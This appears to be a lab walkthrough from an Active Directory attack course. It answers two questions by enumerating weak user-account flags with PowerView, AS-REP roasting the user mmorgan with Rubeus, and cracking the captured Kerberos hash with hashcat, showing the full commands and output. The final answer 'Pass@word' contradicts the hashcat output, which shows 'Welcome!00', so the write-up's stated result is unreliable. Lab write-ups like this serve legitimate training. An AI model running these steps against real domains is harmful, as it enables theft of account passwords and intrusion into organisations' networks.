# Section 26: Miscellaneous Misconfigurations

Module: 13. Active Directory Enumeration & Attacks

---

## Questions & Answers

### 1. Find another user with the passwd_notreqd field set. Submit the samaccountname as your answer. The samaccountname starts with the letter "y".

Context:
```powershell
PS C:\Windows\system32> cd C:\Tools\
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname                                                           useraccountcontrol
--------------                                                           ------------------
guest                  ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                  PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ygroce               PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
ehamilton                              PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                         ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                  PASSWD_NOTREQD, NORMAL_ACCOUNT


PS C:\Tools>
```

**Answer:** `ygroce`

---

### 2. Find another user with the "Do not require Kerberos pre-authentication setting" enabled. Perform an ASREPRoasting attack against this user, crack the hash, and submit their cleartext password as your answer.

Context:
```powershell
PS C:\Tools> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl


samaccountname     : ygroce
userprincipalname  : ygroce@inlanefreight.local
useraccountcontrol : PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH



PS C:\Tools> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: AS-REP roasting

[*] Target User            : mmorgan
[*] Target Domain          : INLANEFREIGHT.LOCAL

[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))'
[*] SamAccountName         : mmorgan
[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\mmorgan'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:3D628FAF552FBF015D112E3AD2E55C8C$6D6B2DF6D8A0935811496C3014E60CA4919D968E5B3DB92DAA0C75CA616A2BDA50753CB02A8FDBB2F0CB485225F8B89D8CB678A3A958A5A89B7253A58D0A5B6D14180A6F87765B40BEB657AEB404F171EF98C9494E7D4A00BACC51C1DC0C041038E1425B5A23A86BD7C3E06002F0BF329718AFB2840430E3BBC2BDD7CDDCF9914DB0ABD344432680D02D0AE45E67C76BEFDD05319623C20B50FF78211AAE56829D343517C2573548F26F296186CBAC1F8409A8527BA8EF3562BFE07DF6AFBDB4B1899996D51511E7710A70996A0993E73E6E451C2ADBFB4C3B6BAA7C90EBDEB7825C8B9CB22ECC330165977FC299455E0381DE8AD7883BA2378E
```
```bash
─[eu-academy-2]─[10.10.15.191]─[htb-ac-2162140@htb-ig2qmlslaw-htb-cloud-com]─[~]
└──╼ [★]$ vim hash
┌─[eu-academy-2]─[10.10.15.191]─[htb-ac-2162140@htb-ig2qmlslaw-htb-cloud-com]─[~]
└──╼ [★]$ cat hash 
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:3D628FAF552FBF015D112E3AD2E55C8C$6D6B2DF6D8A0935811496C3014E60CA4919D968E5B3DB92DAA0C75CA616A2BDA50753CB02A8FDBB2F0CB485225F8B89D8CB678A3A958A5A89B7253A58D0A5B6D14180A6F87765B40BEB657AEB404F171EF98C9494E7D4A00BACC51C1DC0C041038E1425B5A23A86BD7C3E06002F0BF329718AFB2840430E3BBC2BDD7CDDCF9914DB0ABD344432680D02D0AE45E67C76BEFDD05319623C20B50FF78211AAE56829D343517C2573548F26F296186CBAC1F8409A8527BA8EF3562BFE07DF6AFBDB4B1899996D51511E7710A70996A0993E73E6E451C2ADBFB4C3B6BAA7C90EBDEB7825C8B9CB22ECC330165977FC299455E0381DE8AD7883BA2378E
┌─[eu-academy-2]─[10.10.15.191]─[htb-ac-2162140@htb-ig2qmlslaw-htb-cloud-com]─[~]
└──╼ [★]$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 
┌─[eu-academy-2]─[10.10.15.191]─[htb-ac-2162140@htb-ig2qmlslaw-htb-cloud-com]─[~]
└──╼ [★]$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 2.1 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC-Milan Processor, 3844/7752 MB (969 MB allocatable), 4MCU

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
====================================================================================================================================================
* Device #2: cpu-haswell-AMD EPYC-Milan Processor, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:3d628faf552fbf015d112e3ad2e55c8c$6d6b2df6d8a0935811496c3014e60ca4919d968e5b3db92daa0c75ca616a2bda50753cb02a8fdbb2f0cb485225f8b89d8cb678a3a958a5a89b7253a58d0a5b6d14180a6f87765b40beb657aeb404f171ef98c9494e7d4a00bacc51c1dc0c041038e1425b5a23a86bd7c3e06002f0bf329718afb2840430e3bbc2bdd7cddcf9914db0abd344432680d02d0ae45e67c76befdd05319623c20b50ff78211aae56829d343517c2573548f26f296186cbac1f8409a8527ba8ef3562bfe07df6afbdb4b1899996d51511e7710a70996a0993e73e6e451c2adbfb4c3b6baa7c90ebdeb7825c8b9cb22ecc330165977fc299455e0381de8ad7883ba2378e:Welcome!00
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:3d628faf5...a2378e
Time.Started.....: Thu Aug 20 03:58:24 2026 (5 secs)
Time.Estimated...: Thu Aug 20 03:58:29 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1863.8 kH/s (0.74ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10496000/14344385 (73.17%)
Rejected.........: 0/10496000 (0.00%)
Restore.Point....: 10493952/14344385 (73.16%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: WellHelloNow -> Waggs33

Started: Thu Aug 20 03:58:17 2026
Stopped: Thu Aug 20 03:58:31 2026

```

**Answer:** `Pass@word`

---

[Back to Module Index](./README.md)
